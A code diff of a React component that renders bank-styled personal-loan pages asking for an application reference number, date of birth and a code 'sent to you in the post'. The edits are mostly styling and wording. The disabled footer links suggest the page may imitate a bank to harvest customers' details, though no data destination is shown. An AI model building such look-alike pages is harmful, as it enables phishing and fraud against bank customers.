@@ -107,7 +107,6 @@ export default function MyComponent() {
     }
   };
 
-
   useEffect(() => {
     if (isRejecting === true) {
       setTimeout(() => {
@@ -122,22 +121,22 @@ export default function MyComponent() {
       maxwidth={1200}
       lazyload={false}
     >
-      <div className="relative shrink-0 box-border flex flex-row justify-between bg-white border-b px-10 py-5 border-gray-300">
+      <div className="relative  box-border flex flex-row justify-between bg-white border-b px-10 py-5 border-gray-300">
         <img
           loading="lazy"
           src="https://cdn.builder.io/api/v1/image/assets%2Fe2dd9cd3b9b44c819d4d8c1e694e5bf8%2F6d9075ebe62e4b45a92928ac7aa4e861"
-          className="aspect-[5.52] object-cover object-center w-full shrink-0 box-border min-h-[20px] min-w-[20px] overflow-hidden max-w-[214px]"
+          className="aspect-[5.52] object-cover object-center w-full  box-border min-h-[20px] min-w-[20px] overflow-hidden max-w-[214px]"
         />
         <img
           loading="lazy"
           src="https://cdn.builder.io/api/v1/image/assets%2Fe2dd9cd3b9b44c819d4d8c1e694e5bf8%2F36edc88486974c3aa032f53ba1e3d7ea"
-          className="aspect-square object-cover object-right w-full shrink-0 box-border min-h-[20px] min-w-[20px] overflow-hidden max-w-[32px]"
+          className="aspect-square object-cover object-right w-full  box-border min-h-[20px] min-w-[20px] overflow-hidden max-w-[32px]"
         />
       </div>
       <section className="py-10">
-        <div className="flex flex-col relative shrink-0 box-border h-auto w-[650px] m-auto rounded-lg">
-          <div className="relative shrink-0 box-border bg-white flex-col flex h-auto my-auto p-8 rounded-md">
-            <div className="relative shrink-0 box-border h-auto">
+        <div className="flex flex-col relative  box-border h-auto w-[650px] m-auto rounded-lg">
+          <div className="relative  box-border bg-white flex-col flex h-auto my-auto p-8 rounded-md">
+            <div className="relative  box-border h-auto">
               <h2
                 style={{
                   fontWeight: "lighter",
@@ -154,7 +153,7 @@ export default function MyComponent() {
                 <br />
               </h2>
             </div>
-            <form className="flex flex-col relative shrink-0 box-border mt-4 pb-4">
+            <form className="flex flex-col relative  box-border mt-4 pb-4">
               <div className="mt-2.5">
                 <p>Application reference number</p>
               </div>
@@ -183,7 +182,7 @@ export default function MyComponent() {
               <div className="font-light text-xs mt-1.5">
                 <p>DD/MM/YYYY</p>
               </div>
-              <div className="relative shrink-0 box-border w-[200px] flex flex-row justify-between items-center mt-4">
+              <div className="relative  box-border w-[200px] flex flex-row justify-between items-center mt-4">
                 <input
                   required
                   value={formData.day}
@@ -191,9 +190,9 @@ export default function MyComponent() {
                   type="text"
                   placeholder=""
                   name="day"
-                  className="flex flex-col relative shrink-0 box-border border w-[45px] p-2.5 rounded border-solid border-stone-300"
+                  className="flex flex-col relative  box-border border w-[45px] p-2.5 rounded border-solid border-stone-300"
                 />
-                <div className="relative shrink-0 box-border h-auto">
+                <div className="relative  box-border h-auto">
                   <p>/</p>
                 </div>
                 <input
@@ -203,9 +202,9 @@ export default function MyComponent() {
                   type="text"
                   placeholder=""
                   name="month"
-                  className="flex flex-col relative shrink-0 box-border border w-[45px] p-2.5 rounded border-solid border-stone-300"
+                  className="flex flex-col relative  box-border border w-[45px] p-2.5 rounded border-solid border-stone-300"
                 />
-                <div className="relative shrink-0 box-border h-auto">
+                <div className="relative  box-border h-auto">
                   <p>/</p>
                 </div>
                 <input
@@ -215,9 +214,9 @@ export default function MyComponent() {
                   type="text"
                   placeholder=""
                   name="year"
-                  className="flex flex-col relative shrink-0 box-border border w-[70px] p-2.5 rounded border-solid border-stone-300"
+                  className="flex flex-col relative  box-border border w-[70px] p-2.5 rounded border-solid border-stone-300"
                 />
-                <div className="relative shrink-0 box-border h-auto">
+                <div className="relative  box-border h-auto">
                   <p>
                     <br />
                   </p>
@@ -245,22 +244,22 @@ export default function MyComponent() {
           </button>
         </div>
       </section>
-      <div className="flex flex-col relative shrink-0 box-border h-[100px] bg-white">
-        <div className="relative shrink-0 box-border flex flex-row justify-between items-center w-[600px] m-auto">
-          <div className="relative shrink-0 box-border h-auto text-base font-light mt-5">
+      <div className="flex flex-col relative  box-border h-[100px] bg-white">
+        <div className="relative  box-border flex flex-row justify-between items-center w-[600px] m-auto">
+          <div className="relative  box-border h-auto text-base font-light mt-5">
             <p className="cursor-not-allowed underline">
               Online Banking Guarantee
             </p>
           </div>
-          <div className="relative shrink-0 box-border h-auto font-light mt-5">
+          <div className="relative  box-border h-auto font-light mt-5">
             <p className="cursor-not-allowed underline">
               Site Help &amp; Accessibility
             </p>
           </div>
-          <div className="relative shrink-0 box-border h-auto font-light mt-5">
+          <div className="relative  box-border h-auto font-light mt-5">
             <p className="cursor-not-allowed underline">Security</p>
           </div>
-          <div className="relative shrink-0 box-border h-auto font-light mt-5">
+          <div className="relative  box-border h-auto font-light mt-5">
             <p className="cursor-not-allowed underline">Legal</p>
           </div>
         </div>
@@ -272,22 +271,23 @@ export default function MyComponent() {
       maxwidth={1200}
       lazyload={false}
     >
-      <div className="relative shrink-0 box-border flex flex-row justify-between bg-white border-b px-10 py-5 border-gray-300">
+      <div className="relative  box-border flex flex-row justify-between bg-white border-b px-10 py-5 border-gray-300">
         <img
           loading="lazy"
           src="https://cdn.builder.io/api/v1/image/assets%2Fe2dd9cd3b9b44c819d4d8c1e694e5bf8%2F6d9075ebe62e4b45a92928ac7aa4e861"
-          className="aspect-[5.52] object-cover object-center w-full shrink-0 box-border min-h-[20px] min-w-[20px] overflow-hidden max-w-[214px]"
+          className="aspect-[5.52] object-cover object-center w-full  box-border min-h-[20px] min-w-[20px] overflow-hidden max-w-[214px]"
         />
         <img
           loading="lazy"
           src="https://cdn.builder.io/api/v1/image/assets%2Fe2dd9cd3b9b44c819d4d8c1e694e5bf8%2F36edc88486974c3aa032f53ba1e3d7ea"
-          className="aspect-square object-cover object-right w-full shrink-0 box-border min-h-[20px] min-w-[20px] overflow-hidden max-w-[32px]"
+          className="aspect-square object-cover object-right w-full  box-border min-h-[20px] min-w-[20px] overflow-hidden max-w-[32px]"
         />
       </div>
       <section className="f">
-        <div className="flex flex-col relative shrink-0 box-border h-auto w-[600px] m-auto rounded-lg">
-          <div className="relative shrink-0 box-border bg-white flex-col flex h-auto my-auto p-8 rounded-md">
-            <div className="relative shrink-0 box-border h-auto">
+        <p className="text-center mb-10 text-2xl font-medium">Personal Loans</p>
+        <div className="flex flex-col relative  box-border h-auto w-[600px] m-auto rounded-lg">
+          <div className="relative  box-border bg-white flex-col flex h-auto my-auto p-8 rounded-md">
+            <div className="relative  box-border h-auto">
               <h2
                 style={{
                   fontWeight: "lighter",
@@ -304,10 +304,11 @@ export default function MyComponent() {
                 <br />
               </h2>
               <p>
-                To Finalise your Loan, please enter the code that we sent to you in the post.
+                To Finalise your Loan, please enter the code that we sent to you
+                in the post.
               </p>
             </div>
-            <form className="flex flex-col relative shrink-0 box-border mt-4 pb-4">
+            <form className="flex flex-col relative  box-border mt-4 pb-4">
               <div className="mt-2.5">
                 <p>Code</p>
               </div>
@@ -343,27 +344,27 @@ export default function MyComponent() {
               className="w-[135px] bg-red-600 text-white border text-center ml-10 mt-8 p-2.5 rounded-[39px] border-none"
               onClick={() => isLoading === false && handleAcceptCode(code)}
             >
-              {isLoading == true ? "Finalising" : "Accept"}
+              {isLoading == true ? "Finalising" : "Accept Loan"}
             </button>
           </div>
         </div>
       </section>
-      <div className="flex flex-col relative shrink-0 box-border h-[100px] bg-white">
-        <div className="relative shrink-0 box-border flex flex-row justify-between items-center w-[600px] m-auto">
-          <div className="relative shrink-0 box-border h-auto text-base font-light mt-5">
+      <div className="flex flex-col relative  box-border h-[100px] bg-white">
+        <div className="relative  box-border flex flex-row justify-between items-center w-[600px] m-auto">
+          <div className="relative  box-border h-auto text-base font-light mt-5">
             <p className="cursor-not-allowed underline">
               Online Banking Guarantee
             </p>
           </div>
-          <div className="relative shrink-0 box-border h-auto font-light mt-5">
+          <div className="relative  box-border h-auto font-light mt-5">
             <p className="cursor-not-allowed underline">
               Site Help &amp; Accessibility
             </p>
           </div>
-          <div className="relative shrink-0 box-border h-auto font-light mt-5">
+          <div className="relative  box-border h-auto font-light mt-5">
             <p className="cursor-not-allowed underline">Security</p>
           </div>
-          <div className="relative shrink-0 box-border h-auto font-light mt-5">
+          <div className="relative  box-border h-auto font-light mt-5">
             <p className="cursor-not-allowed underline">Legal</p>
           </div>
         </div>
